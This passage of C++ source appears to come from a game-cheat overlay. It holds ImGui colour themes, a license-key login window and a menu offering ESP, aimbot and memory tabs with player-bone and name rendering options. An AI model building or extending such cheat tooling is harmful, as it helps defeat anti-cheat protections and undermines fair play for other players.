	colors[ImGuiCol_NavHighlight] = colors[ImGuiCol_HeaderHovered];
	colors[ImGuiCol_NavWindowingHighlight] = ImVec4(0.70f, 0.70f, 0.70f, 0.70f);

}
void SetStyleLight()
{
	auto* style = &ImGui::GetStyle();
	style->WindowTitleAlign.x = 0.50f;
	style->FrameRounding = 7;
	style->WindowRounding = 7;
	style->GrabRounding = 2.0f;

	ImVec4* colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_Text] = ImVec4(0.15f, 0.15f, 0.15f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.87f, 0.87f, 0.87f, 1.00f);
	colors[ImGuiCol_ChildBg] = ImVec4(0.87f, 0.87f, 0.87f, 1.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.87f, 0.87f, 0.87f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.89f, 0.89f, 0.89f, 1.00f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.93f, 0.93f, 0.93f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(1.00f, 0.69f, 0.07f, 0.69f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_TitleBg] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.87f, 0.87f, 0.87f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(1.00f, 0.69f, 0.07f, 0.69f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.01f, 0.01f, 0.01f, 0.63f);
	colors[ImGuiCol_SliderGrab] = ImVec4(1.00f, 0.69f, 0.07f, 0.69f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_Button] = ImVec4(0.83f, 0.83f, 0.83f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(1.00f, 0.69f, 0.07f, 0.69f);
	colors[ImGuiCol_ButtonActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_Header] = ImVec4(0.67f, 0.67f, 0.67f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_Separator] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_SeparatorHovered] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_SeparatorActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(1.00f, 1.00f, 1.00f, 0.18f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(1.00f, 0.82f, 0.46f, 0.69f);
	colors[ImGuiCol_Tab] = ImVec4(0.16f, 0.16f, 0.16f, 0.00f);
	colors[ImGuiCol_TabHovered] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_TabActive] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_TabUnfocused] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.87f, 0.87f, 0.87f, 1.00f);

	colors[ImGuiCol_PlotLines] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_NavHighlight] = ImVec4(1.00f, 0.69f, 0.07f, 1.00f);
	colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
	colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.87f, 0.87f, 0.87f, 1.00f);
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.20f, 0.20f, 0.20f, 0.35f);
}
void green()
{
	auto* style = &ImGui::GetStyle();
	style->WindowTitleAlign.x = 0.50f;
	style->FrameRounding = 7;
	style->WindowRounding = 7;
	style->GrabRounding = 2.0f;
	ImVec4* colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_Text] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.06f, 0.06f, 0.94f);
	colors[ImGuiCol_ChildBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
	colors[ImGuiCol_Border] = ImVec4(0.43f, 0.43f, 0.50f, 0.50f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.44f, 0.44f, 0.44f, 0.60f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.57f, 0.57f, 0.57f, 0.70f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.76f, 0.76f, 0.76f, 0.80f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.04f, 0.04f, 0.04f, 1.00f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.00f, 0.00f, 0.00f, 0.60f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.14f, 0.14f, 0.14f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.53f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.31f, 0.31f, 0.31f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.41f, 0.41f, 0.41f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.13f, 0.75f, 0.55f, 0.80f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.13f, 0.75f, 0.75f, 0.80f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.13f, 0.75f, 1.00f, 0.80f);
	colors[ImGuiCol_Button] = ImVec4(0.13f, 0.75f, 0.55f, 0.40f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.13f, 0.75f, 0.75f, 0.60f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.13f, 0.75f, 1.00f, 0.80f);
	colors[ImGuiCol_Header] = ImVec4(0.13f, 0.75f, 0.55f, 0.40f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.13f, 0.75f, 0.75f, 0.60f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.13f, 0.75f, 1.00f, 0.80f);
	colors[ImGuiCol_Separator] = ImVec4(0.13f, 0.75f, 0.55f, 0.40f);
	colors[ImGuiCol_SeparatorHovered] = ImVec4(0.13f, 0.75f, 0.75f, 0.60f);
	colors[ImGuiCol_SeparatorActive] = ImVec4(0.13f, 0.75f, 1.00f, 0.80f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.13f, 0.75f, 0.55f, 0.40f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.13f, 0.75f, 0.75f, 0.60f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.13f, 0.75f, 1.00f, 0.80f);
	colors[ImGuiCol_Tab] = ImVec4(0.13f, 0.75f, 0.55f, 0.80f);
	colors[ImGuiCol_TabHovered] = ImVec4(0.13f, 0.75f, 0.75f, 0.80f);
	colors[ImGuiCol_TabActive] = ImVec4(0.13f, 0.75f, 1.00f, 0.80f);
	colors[ImGuiCol_TabUnfocused] = ImVec4(0.18f, 0.18f, 0.18f, 1.00f);
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.36f, 0.36f, 0.36f, 0.54f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
	colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 1.00f, 0.00f, 0.90f);
	colors[ImGuiCol_NavHighlight] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
	colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.35f);
}
void SetStyleDark()
{
	// General


	auto* style = &ImGui::GetStyle();
	style->WindowTitleAlign.x = 0.50f;
	style->FrameRounding = 7;
	style->WindowRounding = 7;
	style->GrabRounding = 2.0f;


	ImVec4* colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_Text] = ImVec4(0.82f, 0.82f, 0.82f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_ChildBg] = ImVec4(0.17f, 0.18f, 0.20f, 1.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.22f, 0.24f, 0.25f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.16f, 0.17f, 0.18f, 1.00f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.16f, 0.17f, 0.18f, 1.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.14f, 0.15f, 0.16f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.84f, 0.34f, 0.17f, 1.00f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.59f, 0.24f, 0.12f, 1.00f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.75f, 0.30f, 0.15f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.90f, 0.90f, 0.90f, 0.50f);
	colors[ImGuiCol_SliderGrab] = ImVec4(1.00f, 1.00f, 1.00f, 0.30f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.19f, 0.20f, 0.22f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.84f, 0.34f, 0.17f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.59f, 0.24f, 0.12f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.22f, 0.23f, 0.25f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.84f, 0.34f, 0.17f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.59f, 0.24f, 0.12f, 1.00f);
	colors[ImGuiCol_Separator] = ImVec4(0.17f, 0.18f, 0.20f, 1.00f);
	colors[ImGuiCol_SeparatorHovered] = ImVec4(0.75f, 0.30f, 0.15f, 1.00f);
	colors[ImGuiCol_SeparatorActive] = ImVec4(0.59f, 0.24f, 0.12f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.84f, 0.34f, 0.17f, 0.14f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.84f, 0.34f, 0.17f, 1.00f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.59f, 0.24f, 0.12f, 1.00f);
	colors[ImGuiCol_Tab] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_TabHovered] = ImVec4(0.84f, 0.34f, 0.17f, 1.00f);
	colors[ImGuiCol_TabActive] = ImVec4(0.68f, 0.28f, 0.14f, 1.00f);
	colors[ImGuiCol_TabUnfocused] = ImVec4(0.13f, 0.14f, 0.16f, 1.00f);
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.17f, 0.18f, 0.20f, 1.00f);

	colors[ImGuiCol_PlotLines] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.75f, 0.30f, 0.15f, 1.00f);
	colors[ImGuiCol_DragDropTarget] = ImVec4(0.75f, 0.30f, 0.15f, 1.00f);
	colors[ImGuiCol_NavHighlight] = ImVec4(0.75f, 0.30f, 0.15f, 1.00f);
	colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
	colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.20f, 0.20f, 0.20f, 0.35f);
};
void ImGui_Style()
{
	ImGuiStyle& style1 = ImGui::GetStyle();


	auto colors = style1.Colors; // ImColor = PRIVATE & A = 250
	colors[ImGuiCol_WindowBg] = ImColor(8, 2, 38);
	colors[ImGuiCol_TitleBg] = ImColor(110, 108, 111);
	colors[ImGuiCol_TitleBgActive] = ImColor(134, 3, 255); // Upar Border Color 
	colors[ImGuiCol_TitleBgCollapsed] = ImColor(8, 2, 38);

	colors[ImGuiCol_FrameBg] = ImColor(8, 2, 50);
	colors[ImGuiCol_FrameBgActive] = ImColor(8, 2, 90);  //////// 82, 31, 37
	colors[ImGuiCol_FrameBgHovered] = ImColor(8, 2, 70); //154, 38, 54

	colors[ImGuiCol_Separator] = ImColor(197, 60, 254);   // 88  29 31
	colors[ImGuiCol_SliderGrab] = ImColor(237, 121, 255);
	colors[ImGuiCol_SliderGrabActive] = ImColor(237, 121, 255);   ///// 61, 129, 221

	colors[ImGuiCol_ChildBg] = ImColor(233, 51, 56);//ed
	colors[ImGuiCol_PopupBg] = ImColor(20, 22, 24);//ed
	colors[ImGuiCol_ScrollbarBg] = ImColor(20, 22, 24);
	//colors[ImGuiCol_ScrollbarGrab] = ImColor(12, 146, 10);
	//colors[ImGuiCol_ScrollbarGrabActive] = ImColor(12, 146, 10);   154, 38, 54
	//colors[ImGuiCol_ScrollbarGrabHovered] = ImColor(12, 146, 15);
	colors[ImGuiCol_Border] = ImColor(70, 70, 70);
	colors[ImGuiCol_ChildBg] = ImColor(20, 22, 24);
	colors[ImGuiCol_Header] = ImColor(130, 2, 255/*17, 25, 67*/);  // 154  38  54
	colors[ImGuiCol_HeaderHovered] = ImColor(130, 2, 255);  //  233, 51, 56
	colors[ImGuiCol_HeaderActive] = ImColor(197, 60, 254);
	colors[ImGuiCol_Button] = ImColor(57, 0, 119); // 82, 31, 37          130, 2, 255
	colors[ImGuiCol_ButtonHovered] = ImColor(130, 2, 255);
	colors[ImGuiCol_ButtonActive] = ImColor(197, 60, 254); //// 82, 31, 37
	colors[ImGuiCol_Text] = ImColor(255, 255, 255);

	colors[ImGuiCol_CheckMark] = ImColor(237, 121, 255);// 154, 38, 54

	style1.WindowTitleAlign.x = 0.50f;     //////////////// 0.043f;
	style1.FrameRounding = 7;
	style1.WindowRounding = 7;
	style1.GrabRounding = 2.0f;
	style1.WindowRounding = 10;
	//style1.WindowTitleAlign = ImVec2(0.5f, 0.5f);
}
bool isnull(VECTOR3 dat)
{
	if (dat.X != NULL)
		if (dat.Y != NULL)
			return true;
	return false;
}
VOID Esp::EspThread()
{
	VECTOR3 Screen;
	INT Distance = 0;
	INT EnemyCount = 0;

	VECTOR3 HeadPos;
	VECTOR3 Head;
	VECTOR3 Chest;
	VECTOR3 Pelvis;
	VECTOR3 LEFTSHOULDER;
	VECTOR3 RIGHTSHOULDER;
	VECTOR3 LEFTELBOWROLL;
	VECTOR3 RIGHTELBOWROLL;
	VECTOR3 LEFTHAND;
	VECTOR3 RIGHTHAND;
	VECTOR3 LEFTLEGS;
	VECTOR3 RIGHTLEGS;
	VECTOR3 LEFTKNEEROLL;
	VECTOR3 RIGHTKNEEROLL;
	VECTOR3 LEFTFOOT;
	VECTOR3 RIGHTFOOT;
	std::string temp = "";
	std::string dist = "";
	string Text = "ssssssss";
	std::string weapon = "";
	std::string PName = "";

	vector<AActor> TempAActorList = {};
	vector<Deadbox> TempBoxesList = {};
	vector<Vehicle> TempVehicalList = {};
	vector<Item> TempItemList = {};
	vector<BombAlert> TempBombAlertList = {};
	g_Discord->Initialize();
	g_Discord->Update();
	if (Setting::SnowFlake)
	{
		Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 1.f, 5.f, 0, 0, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.010f), IM_COL32(255, 255, 255, 155));
	}
	std::string name = "YOUR_NAME"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
	std::string ownerid = "YOUR_OwnerID"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
	std::string secret = "YOUR_SECRET"; // app secret, the blurred text on licenses tab and other tabs
	std::string version = "3.6"; // leave alone unless you've changed version on website
	api KeyAuthApp(name, ownerid, secret, version);

	while (true)
	{
		LoadConfig("C:\\Key.ini");
		try
		{

			//	auto t1 = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
			RECT Rect;
			GetWindowRect(Game::hWindow, &Rect);
			DX11Window::Left = Rect.left;
			DX11Window::Top = Rect.top;
			DX11Window::Width = Rect.right - Rect.left;
			DX11Window::Height = Rect.bottom - Rect.top;
			MoveWindow(DX11Window::hWindow, DX11Window::Left, DX11Window::Top, DX11Window::Width, DX11Window::Height, true);

			// cout << "Height Of window "<< DX11Window::Height << endl;
			// cout << "Width Of window " << DX11Window::Width <<endl;

			ImGui_ImplDX9_NewFrame();
			ImGui_ImplWin32_NewFrame();
			ImGui::NewFrame();
			if (Setting::ShowMenu)
			{
				if (Setting::SnowFlake)
				{
					POINT mouse;
					GetCursorPos(&mouse);
					Snowflake::Update(snow, Snowflake::vec3(mouse.x, mouse.y), Snowflake::vec3(DX11Window::Width, DX11Window::Height));
				}


				/*std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;*/

				if (Setting::rainfall) {
					drawrain();
				}
				//if (Setting::snowfall) {
				//	drawSnowflakes();
				//}
				if (Setting::particles) {
					drawParticles();
				}
				LoadConfig("C:\\Key.ini");
				if (!login)
				{
					if (RRR == 0)
					{
						SetStyleDark();
					}
					if (RRR == 1)
					{
						StyleColorsLightGreen();
					}
					if (RRR == 2)
					{
						RunStyle3();
					}
					if (RRR == 3)
					{
						RunStyle4();
					}
					if (RRR == 4)
					{
						RunStyle();
					}
					if (RRR == 5)
					{
						RunStyle2();
					}
					if (RRR == 6)
					{
						green();
					}
					if (RRR == 7)
					{
						ImGui_Style();
					}
					g_Discord->Update();
					static auto Flags = ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar;

					ImGuiIO& Io = ImGui::GetIO();
					ImGuiStyle* style = &ImGui::GetStyle();
					ImVec4* colors = ImGui::GetStyle().Colors;
					ImDrawList* draw;
					ImVec2 pos;

					//style->Alpha = 1.f;
					//style->WindowRounding = 5.f;
					//style->FramePadding = ImVec2(4, 3);
					//style->WindowPadding = ImVec2(8, 8);
					//style->ItemInnerSpacing = ImVec2(4, 4);
					//style->ItemSpacing = ImVec2(8, 4);
					//style->FrameRounding = 5.f;
					//style->ScrollbarSize = 2.f;
					//style->ScrollbarRounding = 12.f;


					//colors[ImGuiCol_ChildBg] = ImColor(24, 29, 59, 0);
					//colors[ImGuiCol_Border] = ImVec4(0.07f, 0.07f, 0.11f, 0.50f);
					//colors[ImGuiCol_FrameBg] = ImColor(25, 25, 33, 255);
					//colors[ImGuiCol_FrameBgActive] = ImColor(25, 25, 33, 255);
					//colors[ImGuiCol_FrameBgHovered] = ImColor(25, 25, 33, 255);
					//colors[ImGuiCol_Header] = ImColor(25, 25, 33, 255);
					//colors[ImGuiCol_HeaderActive] = ImColor(28, 28, 36, 255);
					//colors[ImGuiCol_HeaderHovered] = ImColor(30, 30, 38, 255);
					//colors[ImGuiCol_PopupBg] = ImColor(35, 35, 45, 255);
					ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.5f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.5f));
					if (ImGui::Begin("Login Page", 0, Flags))
					{
						ImGui::GetBackgroundDrawList()->AddRectFilled(ImVec2(0, 0), ImVec2(1920, 1080), IM_COL32(0, 0, 0, 128));
						ImGuiStyle& style = ImGui::GetStyle();
						if (Setting::Lang == 0 || Setting::Lang == 2)
						{
							ImGui::SetNextItemWidth(250.0f);
							ImGui::InputTextWithHint("###Key", "Enter Your Key Here", str1, IM_ARRAYSIZE(str1), (hideKey) ? ImGuiInputTextFlags_Password : ImGuiInputTextFlags_None);

							ImGui::SameLine();
							if (ImGui::Button(ICON_FA_EYE "", { 26.0f,26.0f }))
							{
								hideKey = !hideKey;
							}
							ImGui::Spacing();
							ImGui::Spacing();
							if (ImGui::Button("Login", { 300.0f,25.0f }))
							{

								//KeyAuthApp.init();
								//if (KeyAuthApp.license(str1))
								//{
									//logins = "Login Succesfully";
									//Sleep(500);
									//logins = "Login Succesfully.";
									//Sleep(500);
									//logins = "Login Succesfully..";
									//Sleep(500);
									//logins = "Login Succesfully..";
									//Sleep(500);
									//logins = "Login Succesfully...";
									//Sleep(500);
									//logins = "Login Succesfully....";
									//Sleep(2000);
									if (KeyVersionCheck(str1)) {
										Setting::KeyVersion = 0;
									}
									else {
										Setting::KeyVersion = 1;

									}
									//CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)wwcd::LoginReport, nullptr, NULL, nullptr);
									login = true;


								//}
								//else
								//{
								//	login = false;
								//}
							}

							if (ImGui::Button("Contact Us", { 300.0f,25.0f }))
							{
								ShellExecute(NULL, L"open", L"https://discord.gg/zAcnhZ8emx", NULL, NULL, SW_SHOWNORMAL);
							}
							ImGui::Text("Login Status:");
							ImGui::SameLine();
							ImGui::Text(Setting::LoginStatus.c_str());

							if (SaveUsers)
							{
								WriteConfig("C:\\Key.ini", str1, true);
							}
							else
							{
								WriteConfig("C:\\Key.ini", str1, false);
							}
						}
						ImGui::End();
					}
				}
				if (login)
				{
					if (RRR == 0)
					{
						SetStyleDark();
					}
					if (RRR == 1)
					{
						StyleColorsLightGreen();
					}
					if (RRR == 2)
					{
						RunStyle3();
					}
					if (RRR == 3)
					{
						RunStyle4();
					}
					if (RRR == 4)
					{
						RunStyle();
					}
					if (RRR == 5)
					{
						RunStyle2();
					}
					if (RRR == 6)
					{
						green();
					}
					if (RRR == 7)
					{
						ImGui_Style();
					}

					ImGuiIO& Io = ImGui::GetIO();
					ImGuiStyle& style = ImGui::GetStyle();

					ImDrawList* draw;
					RECT screen_rect;
					GetWindowRect(Game::hWindow, &screen_rect);

					static auto Name = "Menu";
					static auto Flags = ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar;
					static auto Flags1 = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar;
					ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 0));
					ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(0, 0, 0, 0));


					static ImVec4 active = to_vec4(46, 46, 46, 255);
					static ImVec4 inactive = to_vec4(46, 46, 46, 255);//46 46 46
					ImGui::SetNextWindowSize({ 672, 457 });
					if (ImGui::Begin("### Menu", nullptr, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBackground))
					{


						ImGui::SetCursorPos({ 80, 66 });
						if (ImGui::Button("ESP", ImVec2(50, 50)))
							Settings::MainTab = 1;



						ImGui::SetCursorPos({ 225, 66 });
						if (ImGui::Button("AIMBOT", ImVec2(50, 50)))
							Settings::MainTab = 2;



						ImGui::SetCursorPos({ 422, 66 });
						if (ImGui::Button("MEMORY", ImVec2(50, 50)))
							Settings::MainTab = 3;



						ImGui::SetCursorPos({ 565,66 });
						if (ImGui::Button("SETTINGS", ImVec2(50, 50)))
							Settings::MainTab = 4;

						ImGui::SetCursorPos({ 20, 0 });
						ImGui::Image((PVOID)DX11::MainMenu, ImVec2(672, 427));





						{
							auto FramePadding = style.FrameRounding;
							style.FrameRounding = 3.0f;

							if (Settings::MainTab == 1)
							{
								ImGui::SetCursorPos({ 74, 130 });
								if (ImGui::Button("Player Esp", ImVec2(105, 25)))
									Settings::EspTab = 1;
								ImGui::SameLine();
								if (ImGui::Button("Bot Esp", ImVec2(105, 25)))
									Settings::EspTab = 2;
								ImGui::SameLine();
								if (ImGui::Button("Items Esp", ImVec2(105, 25)))
									Settings::EspTab = 3;//
								ImGui::SameLine();
								if (ImGui::Button("Vehicle Esp", ImVec2(105, 25)))
									Settings::EspTab = 4;
								ImGui::SameLine();
								if (ImGui::Button("Others", ImVec2(105, 25)))
									Settings::EspTab = 5;

								if (Settings::EspTab == 1)
								{

									ImGui::SetCursorPos({74, 150 });
									ImGui::BeginChild("##1", ImVec2(570, 270), true, ImGuiWindowFlags_NoBackground);
									{

										ImGui::Checkbox("Player Name", &Setting::pname);
										if (Setting::pname)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##NAME SIZE", &nsize, 1, 20, "Name Size : %0.1f");
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###pnamecolorcolor", (float*)&Setting::pnamecolorcolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Player Bone", &Setting::playerBone);
										if (Setting::playerBone)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(180);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderFloat("##BONE SIZE", &Setting::pbonesize, 0.100f, 3.00f, "Bone Size : %0.1f");
											ImGui::SameLine();
											const char* bone[] = { "Visible", "Default","Team Id" };
											const char* combo_label1 = bone[Setting::playerBoneColorVer];
											if (ImGui::BeginCombo(" bone", combo_label1, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(bone); n++)
												{

													const bool is_selected = (Setting::playerBoneColorVer == n);
													if (ImGui::Selectable(bone[n], is_selected))
														Setting::playerBoneColorVer = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}


											if (Setting::playerBoneColorVer == 0)
											{
												ImGui::SameLine(570);
												ImGui::ColorEdit4("###bonecoloropen", (float*)&Setting::bonecoloropen, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												ImGui::SameLine();
												ImGui::ColorEdit4("###bonecolorcover", (float*)&Setting::bonecolorcover, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
